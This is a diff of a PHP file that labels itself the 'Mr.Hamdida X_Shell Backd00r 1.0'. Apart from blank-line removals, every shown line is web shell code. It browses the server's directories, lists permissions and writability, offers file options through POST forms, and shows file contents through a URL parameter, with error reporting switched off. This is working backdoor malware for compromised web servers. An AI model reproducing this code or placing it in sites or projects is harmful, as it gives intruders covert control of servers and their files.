@@ -1,7 +1,6 @@
 <?php
 set_time_limit(0);
 error_reporting(0);
-
 if(get_magic_quotes_gpc()){
 foreach($_POST as $key=>$value){
 $_POST[$key] = stripslashes($value);
@@ -62,7 +61,6 @@ $path = getcwd();
 }
 $path = str_replace('\\','/',$path);
 $paths = explode('/',$path);
-
 foreach($paths as $id=>$pat){
 if($pat == '' && $id == 0){
 $a = true;
@@ -170,7 +168,6 @@ echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacin
 <td><center>Permissions</center></td>
 <td><center>Options</center></td>
 </tr>';
-
 foreach($scandir as $dir){
 if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
 echo "<tr>
@@ -181,7 +178,6 @@ if(is_writable("$path/$dir")) echo '<font color="green">';
 elseif(!is_readable("$path/$dir")) echo '<font color="red">';
 echo perms("$path/$dir");
 if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
-
 echo "</center></td>
 <td><center><form method=\"POST\" action=\"?option&path=$path\">
 <select name=\"opt\">
@@ -207,7 +203,6 @@ $size = round($size/1024,2).' MB';
 }else{
 $size = $size.' KB';
 }
-
 echo "<tr>
 <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
 <td><center>".$size."</center></td>
@@ -240,7 +235,6 @@ echo '<br />Mr.Hamdida X_Shell Backd00r <font color="red">1.0</font>, Coded By <
 </HTML>';
 function perms($file){
 $perms = fileperms($file);
-
 if (($perms & 0xC000) == 0xC000) {
 // Socket
 $info = 's';
@@ -266,28 +260,24 @@ $info = 'p';
 // Unknown
 $info = 'u';
 }
-
 // Owner
 $info .= (($perms & 0x0100) ? 'r' : '-');
 $info .= (($perms & 0x0080) ? 'w' : '-');
 $info .= (($perms & 0x0040) ?
 (($perms & 0x0800) ? 's' : 'x' ) :
 (($perms & 0x0800) ? 'S' : '-'));
-
 // Group
 $info .= (($perms & 0x0020) ? 'r' : '-');
 $info .= (($perms & 0x0010) ? 'w' : '-');
 $info .= (($perms & 0x0008) ?
 (($perms & 0x0400) ? 's' : 'x' ) :
 (($perms & 0x0400) ? 'S' : '-'));
-
 // World
 $info .= (($perms & 0x0004) ? 'r' : '-');
 $info .= (($perms & 0x0002) ? 'w' : '-');
 $info .= (($perms & 0x0001) ?
 (($perms & 0x0200) ? 't' : 'x' ) :
 (($perms & 0x0200) ? 'T' : '-'));
-
 return $info;
 }
 ?>
